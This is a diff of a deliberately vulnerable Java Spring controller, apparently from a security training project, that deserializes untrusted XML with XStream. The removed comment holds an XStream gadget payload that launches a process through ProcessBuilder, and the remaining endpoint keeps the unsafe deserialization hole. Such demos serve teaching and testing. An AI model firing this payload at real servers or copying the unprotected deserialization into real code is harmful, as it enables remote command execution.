@@ -17,24 +17,6 @@ import org.springframework.web.bind.annotation.RestController;
 @RequestMapping("/XStream")
 public class XStreamVul {
 
-    /**
-     * @poc 存在多个poc
-     * <sorted-set>
-     * <dynamic-proxy>
-     * <interface>java.lang.Comparable</interface>
-     * <handler class="java.beans.EventHandler">
-     * <target class="java.lang.ProcessBuilder">
-     * <command>
-     * <string>open</string>
-     * <string>-a</string>
-     * <string>Calculator</string>
-     * </command>
-     * </target>
-     * <action>start</action>
-     * </handler>
-     * </dynamic-proxy>
-     * </sorted-set>
-     */
     @RequestMapping("/vul")
     public String vul(@RequestBody String content) {
         XStream xs = new XStream();
@@ -81,7 +63,7 @@ public class XStreamVul {
                 "</map>";
 
         XStream xs = new XStream();
-        // 有效：XStream.setupDefaultSecurity(xs);
+        // XStream.setupDefaultSecurity(xs);
 
         xs.fromXML(xml_poc);
     }
